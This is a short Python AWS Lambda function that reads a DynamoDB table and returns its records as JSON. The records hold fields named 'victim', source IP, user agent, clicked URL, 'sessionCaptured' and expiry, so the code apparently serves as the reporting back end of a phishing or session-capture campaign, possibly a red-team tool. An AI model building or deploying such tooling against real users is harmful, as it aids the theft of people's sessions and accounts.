import json
import boto3


def dump_table():
    dynamodb = boto3.resource('dynamodb')
    table = dynamodb.Table('sessionTable')
    return parse_data(table.scan()['Items'])


def parse_data(data):
    res = []

    for click in data:
        res.append(
            {
                'victim': str(click['victim']),
                'soureIp': str(click.get('soureIp')),
                'userAgent': str(click['userAgent']),
                'urlClicked': str(click['urlClicked']),
                'sessionCaptured': str(click['sessionCaptured']),
                'urlExpires': str(click['urlExpires'])
            }
        )
    return res

def main(event, context):

    data = dump_table()
    
    response = {
        "statusCode": 200,
        "body": json.dumps(data)
    }

    return response

